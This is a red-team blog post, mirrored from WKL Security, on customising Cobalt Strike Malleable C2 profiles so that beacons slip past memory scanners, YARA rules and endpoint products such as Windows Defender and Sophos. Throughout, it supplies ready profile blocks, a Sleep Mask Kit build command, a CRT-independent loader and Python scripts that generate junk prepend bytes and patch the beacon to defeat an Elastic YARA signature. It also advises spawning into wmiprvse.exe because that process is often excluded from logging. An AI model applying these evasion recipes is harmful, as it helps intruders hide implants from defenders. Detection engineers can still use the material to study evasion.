# https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/

[Posts](https://kleiton0x00.github.io/)Harnessing the Power of Cobalt Strike Profiles for EDR Evasion

Post

Cancel

# Harnessing the Power of Cobalt Strike Profiles for EDR Evasion

Posted May 22, 2023 _2023-05-23T00:00:00+02:00_ by  kleiton0x7e

Mirrored from [WKL Security](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/). This version is an update ahead.

## Introduction

In this blog post, we will go through the importance of each profile’s option, and explore the differences between default and customized Malleable C2 profiles used in the Cobalt Strike framework. In doing so, we demonstrate how the Malleable C2 profile lends versatility to Cobalt Strike. We will also take a step further by improving the existing open-source profiles to make Red-Team engagements more OPSEC-safe. All the scripts and the final profiles used for bypasses are published in our [Github repository](https://github.com/WKL-Sec/Malleable-CS-Profiles).

The article assumes that you are familiar with the fundamentals of flexible C2 and is meant to serve as a guide for developing and improving Malleable C2 profiles. The profile found [here](https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile) is used as a reference profile. Cobalt Strike 4.8 was used during the test cases and we are also going to use our [project code](https://github.com/WKL-Sec/GregsBestFriend/blob/main/Clang-LLVM/GregsBestFriend.cpp) for the Shellcode injection.

The existing profiles are good enough to bypass most of the Antivirus products as well as EDR solutions; however, more improvements can be made in order to make it an OPSEC-safe profile and to bypass some of the most popular YARA rules.

## Bypassing memory scanners

The recent versions of Cobalt Strike have made it so easy for the operators to bypass memory scanners like [BeaconEye](https://github.com/CCob/BeaconEye) and [Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons). The following option will make this bypass possible:

> set sleep\_mask “true”;

By enabling this option, Cobalt Strike will XOR the heap and every image section of its beacon prior to sleeping, leaving no string or data unprotected in the beacon’s memory. As a result, no detection is made by any of the mentioned tools.

![execution_of_hunt_sleeping_beacons](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-15-26.png)

BeaconEye also fails to find the malicious process with the sleeping Beacon:

![execution_of_beaconeye](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-16-45.png)

While it bypassed the memory scanners, cross-referencing the memory regions, we find that it leads us straight to the beacon payload in memory.

![memory_references_to_shellcode](https://whiteknightlabs.com/wp-content/uploads/2023/05/memory_references1.jpg)

This demonstrates that, since the beacon was where the API call originated, execution will return there once the `WaitForSingleObjectEx` function is finished. The reference to a memory address rather than an exported function is a red flag. Both automatic tooling and manual analysis can detect this.

It is highly recommended to enable “stack spoof” using the Artifact Kit in order to prevent such IOC. It is worthwhile to enable this option even though it is not a part of the malleable profile. The spoofing mechanism must be enabled by setting the fifth argument to true:

![example_of_stack_spoofing_with_artifact_kit](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-14-42-47.png)

During the compilation, a .CNA file will be generated and that has to be imported in Cobalt Strike. Once imported, the changes are applied to the new generated payloads. Let’s analyze the Beacon again:

![spoofed_thread_stacks](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-15-06-49.jpg)

The difference is very noticeable. The thread stacks are spoofed, leaving no trace of memory address references.

It should also be mentioned that Cobalt Strike added stack spoofing to the [arsenal kit in June 2021](https://www.cobaltstrike.com/blog/arsenal-kit-update-thread-stack-spoofing/). However, it was found that the call stack spoofing only applied to exe/dll artifacts created using the artifact kit, not to beacons injected via shellcode in an injected thread. They are therefore unlikely to be effective in obscuring the beacon in memory.

## Bypassing static signatures

It is time to test how well the beacon will perform against static signature scanners. Enabling the following feature will remove most of the strings stored in the beacon’s heap:

> set obfuscate “true”;

Once the profile is applied to Cobalt Strike, generate a raw shellcode and put it in the Shellcode loader’s code. Once the EXE was compiled, we analyzed the differences in the stored strings:

![string_differences_between_profile_and_raw_payload](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-08-18-45-25-1024x636.jpg)

During many test cases we realized that the beacon still gets detected even if it is using heavy-customized profiles (including obfuscate). Using [ThreadCheck](https://github.com/rasta-mouse/ThreatCheck) we realized that msvcrt string is being identified as “bad bytes”:

![string_detection_example](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-36-33.png)

This string is found on both Beacon’s heap as well as the payload itself. The reason why `obfuscate` doesn’t remove this string is because `msvcrt.dll` is a dynamically-linked DLL:

![malicious_strings_stored_in_beacons_heap](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-54-18.png)

The msvcrt.dll file is a part of the “Microsoft Visual Studio 6.0” and is crucial for most applications to work properly. It also contains program code that enables applications written in “Microsoft Visual C++” to run properly. Even though this DLL is a legit Windows DLL, Windows Defender consider it as malicious after a while. There are two ways (that I know) which can avoid the usage of `msvcrt.dll`, which will be described below.

## Solution 1: Make the payload CRT library independent

This solution is nothing new, there are plenty of shellcode-loaders on both [Linux](https://github.com/Cipher7/ApexLdr) and [Windows](https://github.com/NUL0x4C/AtomLdr) who archives this. To make the code CRT library independent, you need to manually define a series of function pointer types:

`typedef __time64_t  (WINAPI * _TIME64)   (__time64_t *_Time);
typedef void        (WINAPI * _SRAND)   (unsigned int seed);
typedef int         (WINAPI * _RAND)    (void);
typedef void*       (WINAPI * _MEMSET)  (void* str, int ch, size_t n);
typedef int         (WINAPI * _PRINTF)  (const char *format, ...);
typedef int         (WINAPI * _SPRINTF) (char *str, const char *format, ...);
typedef void*       (WINAPI * _MEMCPY)  (void *dest, const void * src, size_t n);
typedef int         (WINAPI * _MEMCMP)  (const void *str1, const void *str2, size_t n);
typedef size_t      (WINAPI * _STRLEN)  (const char *_Str);
typedef void*       (WINAPI * _REALLOC) (void *_Memory,size_t _NewSize);
typedef void*       (WINAPI * _MALLOC)  (size_t _Size);
typedef wchar_t*    (WINAPI * _WCSCAT)  (wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source);
typedef size_t      (WINAPI * _WCSLEN)  (const wchar_t *_Str);

`

Lastly, the APIS structure organizes these function pointers into groups and includes a handle to a DLL.

`typedef struct APIS {
    struct msvcrt {
        WIN32_FUNC(_time64)
        WIN32_FUNC(srand)
        WIN32_FUNC(rand)
        WIN32_FUNC(memset)
        WIN32_FUNC(memcpy)
        WIN32_FUNC(memcmp)
        //... define as many functions as you need from msvcrt.dll
        WIN32_FUNC(strlen)
        WIN32_FUNC(realloc)
        WIN32_FUNC(malloc)
        WIN32_FUNC(wcscat)
        WIN32_FUNC(wcslen)
        _PRINTF printf;
        _SPRINTF sprintf;
    }msvcrt;

    struct handles {
        HANDLE mscvtdll;
    }handles;
} APIS, *pAPIS;

extern APIS apis;

`

The external declared variable `apis` of type `APIS` will allow access to the function pointers and handles organized in the APIS structure. This means we can now use the CRT functions like the example below:

`APIS apis = { 0 };
CHAR msvcrt_dll[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
apis.handles.mscvtdll = pLoadLibraryA(msvcrt_dll);
apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, HASH_memset);

apis.msvcrt.memset(pRandBuffer,0, sBufferSize);

`

When using the `x86_64-w64-mingw32-gcc` compiler to prevent your application from dynamically linking to `msvcrt.dll`, you can append the `-static` flag. This flag directs the compiler to link against static versions of libraries. Additionally, the `-nostdlib` flag can be used to stop the compiler from linking the standard libraries and startup files, as the required msvcrt functions will be retrieved dynamically within the code. When using `-nostdlib`, it is necessary to manually link essential Windows system libraries by adding flags such as `-lkernel32` and `-luser32`.

More details can be found on [ApexLdr](https://github.com/Cipher7/ApexLdr).

## Solution 2: Clang++ to the rescue

Different compilers have their own set of optimizations and flags that can be used to tailor the output for specific use cases. By experimenting with different compilers, users can achieve better performance and potentially bypass more AV/EDR systems.

For example, Clang++ provides several optimization flags that can help reduce the size of the compiled code, while GCC (G++) is known for its high-performance optimization capabilities. By using different compilers, users can achieve a unique executable that can evade detection:

![mingw_vs_clangpp](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-10-00-33-36.png)

The string **msvcrt.dll** is not shown anymore, resulting in Windows Defender being bypassed:

![no_suspicious_string](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-02-18-56.png)

Testing it against various Antivirus products leads to some promising results (bear in mind that an unencrypted shellcode was used):

![antiscan_results_raw_payload](https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507140514.png)

## Removing strings is never enough

Although having `obfuscate` enabled in our profile, we were still able to detect lots of strings inside the beacon’s stack:

![beacon_stack_full_of_strings](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-01-56-03.png)

We modified the profile a little by adding the following options to remove all the mentioned strings:

`transform-x64 {
    prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
    strrep "This program cannot be run in DOS mode" ""; # Remove this text
    strrep "ReflectiveLoader" "";
    strrep "beacon.x64.dll" "";
    strrep "beacon.dll" ""; # Remove this text
    strrep "msvcrt.dll" "";
    strrep "C:\\Windows\\System32\\msvcrt.dll" "";
    strrep "Stack around the variable" "";
    strrep "was corrupted." "";
    strrep "The variable" "";
    strrep "is being used without being initialized." "";
    strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
    strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
    strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
    strrep "Stack memory was corrupted" "";
    strrep "A local variable was used before it was initialized" "";
    strrep "Stack memory around _alloca was corrupted" "";
    strrep "Unknown Runtime Check Error" "";
    strrep "Unknown Filename" "";
    strrep "Unknown Module Name" "";
    strrep "Run-Time Check Failure" "";
    strrep "Stack corrupted near unknown variable" "";
    strrep "Stack pointer corruption" "";
    strrep "Cast to smaller type causing loss of data" "";
    strrep "Stack memory corruption" "";
    strrep "Local variable used before initialization" "";
    strrep "Stack around" "corrupted";
    strrep "operator" "";
    strrep "operator co_await" "";
    strrep "operator<=>" "";

    }

`

## Prepend OPCODES

This option will append the opcodes you put in the profile in the beginning of the generated raw shellcode. So you must create a fully working shellcode in order not to crash the beacon when executed. Basically we have to create a junk assembly code that won’t affect the original shellcode. We can simply use a series of “0x90” (NOP) instructions, or even better, a dynamic combination of the following assembly instructions’ list. An easy example would be adding and subtracting a same value to different registers:

```asm
inc esp
dec esp
inc ebx
dec ebx
inc eax
dec eax
dec rax
inc rax
nop
xchg ax,ax
nop dword ptr [eax]
nop word ptr [eax+eax]
nop dword ptr [eax+eax]
nop dword ptr [eax]
nop dword ptr [eax]
```

Another set of junk instructions would be to write registers in the stack and restore them using `push` and `pop`:

```asm
pushfq
push rcx
push rdx
push r8
push r9
xor eax, eax
xor eax, eax
xor ebx, ebx
xor eax, eax
xor eax, eax
pop r9
pop r8
pop rdx
pop rcx
popfq
```

Pick a unique combination (by shuffling the instructions or by adding/removing them) and lastly, convert it to \\x format to make it compatible with the profile. In this case, we took the instruction list as it is, so the final junky shellcode will look like the following when converted to the proper format:

`transform-x64 {
        ...
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        ...
}

`

We took this a step further by automating the whole process with a simple [python script](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/prepend.py). The code will generate a random junk shellcode that you can use on the prepend option:

`import random

# Define the byte strings to shuffle
byte_strings = ["40", "41", "42", "6690", "40", "43", "44", "45", "46", "47", "48", "49", "", "4c", "90", "0f1f00", "660f1f0400", "0f1f0400", "0f1f00", "0f1f00", "87db", "87c9", "87d2", "6687db", "6687c9", "6687d2"]

# Shuffle the byte strings
random.shuffle(byte_strings)

# Create a new list to store the formatted bytes
formatted_bytes = []

# Loop through each byte string in the shuffled list
for byte_string in byte_strings:
    # Check if the byte string has more than 2 characters
    if len(byte_string) > 2:
        # Split the byte string into chunks of two characters
        byte_list = [byte_string[i:i+2] for i in range(0, len(byte_string), 2)]
        # Add \x prefix to each byte and join them
        formatted_bytes.append(''.join([f'\\x{byte}' for byte in byte_list]))
    else:
        # Add \x prefix to the single byte
        formatted_bytes.append(f'\\x{byte_string}')

# Join the formatted bytes into a single string
formatted_string = ''.join(formatted_bytes)

# Print the formatted byte string
print(formatted_string)

`

When generating the raw shellcode again with the changed profile, you will notice the prepended bytes (all the bytes before MZ header):

![mz_header_changed](https://whiteknightlabs.com/wp-content/uploads/2023/05/image-4.png)

## The “Millionaire” Header

Adding the `rich_header` doesn’t make any difference in terms of evasion; however, it is still recommended to use it against Thread Hunters. This option is responsible for the meta-information inserted by the compiler. The Rich header is a PE section that serves as a fingerprint of a Windows’ executable’s build environment, and since it is a section that is not going to be executed, we can create a small [python script](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/rich_header.py) to generate junk assembly code:

`import random

def generate_junk_assembly(length):
    return ''.join([chr(random.randint(0, 255)) for _ in range(length)])

def generate_rich_header(length):
    rich_header = generate_junk_assembly(length)
    rich_header_hex = ''.join([f"\\x{ord(c):02x}" for c in rich_header])
    return rich_header_hex

#make sure the number of opcodes has to be 4-byte aligned
print(generate_rich_header(100))

`

Copy the output shellcode, and paste it in the profile (inside stage block):

`stage {
    ...
    set rich_header "\x2e\x9a\xad\xf1...";
    ...
}

`

Note: The length of Rich Header has to be 4-byte aligned, otherwise you will get this OPSEC warning:

![opsec_warning](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-02-08-31.png)

**OPSEC Warning**: To make the Rich Header look more legit, you can convert a real DLL and convert it to a shellcode format.

## Bypassing YARA rules

One of the most challenging YARA rules we faced is from [elastic](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar). Let’s test our raw beacon with all the options we have modified/created by far in our malleable profile.

The rule `Windows_Trojan_CobaltStrike_b54b94ac` can be easily bypassed by using the Sleep Mask from the Arsenal Kit. Even though we previously enabled `sleep_mask` in the malleable profile via `set sleep_mask "true"`, it is still not enough to bypass this static signature, as the performed obfuscation routine is easily detected. In order to use the Sleep Mask Kit, generate the .CNA file via build.sh and import it to Cobalt Strike.

To generate the sleepmask, we must provide arguments. If you are using the latest Cobalt Strike version, put 47 as the first argument. The second argument is related to the used Windows API for Sleeping. We are going to use `WaitForSingleObject` since modern detection solutions possess countermeasures against `Sleep`, for example hooking sleep functions like `Sleep` in C/C++ or `Thread.Sleep` in C# to nullify the sleep, but also fast forwarding. The third argument is recommended to always be set to true, in order to mask plaintext strings inside the beacon’s memory. Lastly, the use of Syscalls will avoid User Land hooking; in this case indirect\_randomized would be the best choice for the Sleep Mask Kit. You can generate the Sleep Mask Kit using the following bash command:

`bash build.sh 47 WaitForSingleObject true indirect output/folder/

`

![building_sleep_mask_kit](https://whiteknightlabs.com/wp-content/uploads/2023/05/image-10.png)

After loading the generated .CNA located in output/ we can scan our raw shellcode. Rule `b54b94ac` is bypassed, however, there are two more rules left to bypass.

![beacon_detected_by_two_yara_rules](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-01-14-14-1024x122.png)

Let’s analyse what the rule `Windows_Trojan_CobaltStrike_1787eef5` is about:

![yara_detection_byte_mz_header](https://whiteknightlabs.com/wp-content/uploads/2023/05/image.png)

By taking a brief look at the rule, we can clearly see that the rule is scanning for the PE headers such as 4D 5A (MZ header). We can confirm that our shellcode is indeed having the flagged bytes:

![mz_header_living_in_beacon](https://whiteknightlabs.com/wp-content/uploads/2023/05/image-6.png)

Fortunately Cobalt Strike has made it so much easier for us to modify the PE header by applying the following option to the profile:

> set magic\_mz\_x64 “OOPS”;

The value can be anything as long as it is four characters long. Adding this option to our profile will make the beacon no longer detected by `Windows_Trojan_CobaltStrike_1787eef5`:

![yara_rule_bypass_1787eef5](https://whiteknightlabs.com/wp-content/uploads/2023/05/image-5-1024x113.png)

And we can see how the magic bytes are changed to what we put earlier on the raw shellcode:

![mz_header_changed_to_oops](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-06-00.png)

Now let’s bypass the `Windows_Trojan_CobaltStrike_f0b627fc` (the hardest one). When disassembling the opcodes of the YARA rule, we get the following:

![opcodes_dissassembled](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-43-44.png)

We can confirm that this exists on our shellcode:

![confirm_that_opcodes_exists_in_beacon](https://whiteknightlabs.com/wp-content/uploads/2023/05/image-7.png)

To workaround this rule, we first have to analyze the shellcode in x64dbg. We set a breakpoint on and eax,0xFFFFFF (the flagged instructions by YARA). In the bottom-right corner of the video you can see that when performing the operations, the zero flag (ZF) is set to 1, thus not taking the jump (JNE instruction):

https://whiteknightlabs.com/wp-content/uploads/2023/05/Screencast-from-18.5.23-033406.MD-CEST.webm

We changed the instruction and eax,0xFFFFFF to mov eax,0xFFFFFF (since these two instructions are almost identical) and you can still see that when executed, the zero flag is still set to 1:

https://whiteknightlabs.com/wp-content/uploads/2023/05/Screencast-from-18.5.23-032619.MD-CEST.webm

Scanning the new generated binary with YARA leads to no detection (both static and in-memory):

![yara_fully_bypassed](https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-18-14-05-20.png)

To fully automate the bytes replacement, we created a [python script](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/rule_f0b627fc_bypass.py) which generates the modified shellcode in a new binary file:

`def replace_bytes(input_filename, output_filename):
    search_bytes      = b"\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00"
    replacement_bytes = b"\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00"

    with open(input_filename, "rb") as input_file:
        content = input_file.read()
        modified_content = content.replace(search_bytes, replacement_bytes)

    with open(output_filename, "wb") as output_file:
        output_file.write(modified_content)

    print(f"Modified content saved to {output_filename}.")

# Example usage
input_filename = "beacon_x64.bin"
output_filename = "output.bin"
replace_bytes(input_filename, output_filename)

`

The code searches for the byte sequence `\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00` (and eax,0xFFFFFF) and replace it with the new byte sequence `\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00` (mov eax, 0xFFFFFF). The changes are later saved to the new binary file.

## Improving the Post Exploitation stage

We took our [reference profile](https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile) and updated the Post Exploitation profile to the following:

`post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}

`

We had to turn off `threadhint` due to detection and also with AMSI disable, since those are a prime memory IOCs. Some profiles are using `svchost.exe` as a process to spawn, but that should never be used anymore. A really good alternative is spawning to `wmiprvse.exe` since this processor is heavily excluded on [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) and other SIEMs due to the extreme amount of logs generated.

## Taking down the final boss

We cannot say this is a bypass unless we manage to bypass a fully-updated EDR; this time we went for Sophos. Bypassing [Sophos](https://www.sophos.com/en-us/products/endpoint-antivirus/edr) (signature detection) was possible only by enabling the following option in the profile:

`set magic_pe "EA";

transform-x64 {
    prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
    strrep "This program cannot be run in DOS mode" "";
    strrep "ReflectiveLoader" "";
    strrep "beacon.x64.dll" "";
    strrep "beacon.dll" "";
}

`

We’ve added set `magic_pe` which changes the PE header magic bytes (and code that depends on these bytes) to something else. You can use whatever you want here, so long as it’s two characters. The `prepend` can be only NOPs instructions, but it is highly recommend to use a junk shellcode generated by our python script (which we explained on the previous sections of the blogpost). While it bypasses the static detection, it is obviously not good enough to bypass the runtime one.

![dynamic_detection_by_sophos](https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507164850.png)

In order to bypass Sophos during the runtime execution, it is necessary to use all the options that are used on our [reference profile](https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile) plus our enhancements. This way we created a fully working beacon that bypasses Sophos EDR (remember that no encryption was used):

![bypassing_sophos_without_encryption](https://whiteknightlabs.com/wp-content/uploads/2023/05/SophosEDR_bypass.webm)

## Conclusion

Even though we used a very basic [code for injecting the raw Shellcode](https://github.com/WKL-Sec/GregsBestFriend/blob/main/Clang-LLVM/GregsBestFriend.cpp) in a local memory process with RWX permission (bad OPSEC), we still managed to bypass modern detections. Utilizing a highly customized and advanced Cobalt Strike profile can prove to be an effective strategy for evading detection by EDR solutions and antivirus software, to such an extent that the encryption of shellcode may become unnecessary. With the ability to tailor the Cobalt Strike profile to specific environments, threat actors gain a powerful advantage in bypassing traditional security measures.

All the scripts and the final profiles used for bypasses are published in our [Github repository](https://github.com/WKL-Sec/Malleable-CS-Profiles).

## References

[https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures](https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures)

[https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows\_Trojan\_CobaltStrike.yar](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar)

[https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon\_events.profile](https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile)

[https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.

Share

Contents

### Further Reading

[Jun 25, 2023 _2023-06-26T00:00:00+02:00_ **Navigating Stealthy WMI Lateral Movement**\\
\\
Mirrored from WKL Security Introduction In this article, we’ll look at a Python script that uses Windows Management Instrumentation (WMI) to remotely control a target computer. The script makes u...](https://kleiton0x00.github.io/posts/Navigating-Stealthy-WMI-Lateral-Movement/)

[May 1, 2023 _2023-05-02T00:00:00+02:00_ **Masking the Implant with Stack Encryption**\\
\\
Mirrored from WKL Security Introduction This article is a demonstration of memory-based detection and evasion techniques. Whenever you build a Command & Control or you perform threat hunting,...](https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/)

[Feb 4, 2023 _2023-02-05T00:00:00+01:00_ **Shellcodes are dead, long live Fileless Shellcodes**\\
\\
Recently I was developing a simple Shellcode Loader which uses Callbacks as an alternative of Shellcode execution. While it bypasses every runtime scanning, it failed to bypass the signature detect...](https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/)

[Masking the Implant with Stack Encryption](https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/) [Navigating Stealthy WMI Lateral Movement](https://kleiton0x00.github.io/posts/Navigating-Stealthy-WMI-Lateral-Movement/)

#### Trending Tags

 [back-to-top](https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/#)